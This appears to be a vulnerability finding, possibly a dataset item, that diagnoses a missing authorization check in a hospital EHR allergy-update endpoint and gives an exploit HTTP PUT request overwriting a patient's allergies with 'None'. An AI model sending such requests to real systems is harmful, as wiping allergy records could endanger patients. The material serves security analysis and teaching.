diagnosis: The allergy record modification endpoint uses Joi validation middleware to verify string lengths and alphanumeric formats, but executes the database update directly using req.validated.patientId without checking if the authenticated doctor is assigned to the patient. An attacker can alter or wipe severe medication allergy histories for any patient in the hospital system.
exploit_request:
PUT /api/patients/pat992104/allergies HTTP/1.1
Host: ehr.hospital.internal:7002
Authorization: Bearer <unauthorized_clinician_jwt>
Content-Type: application/json

{
  "allergies": ["None"],
  "severityRating": "MILD"
}
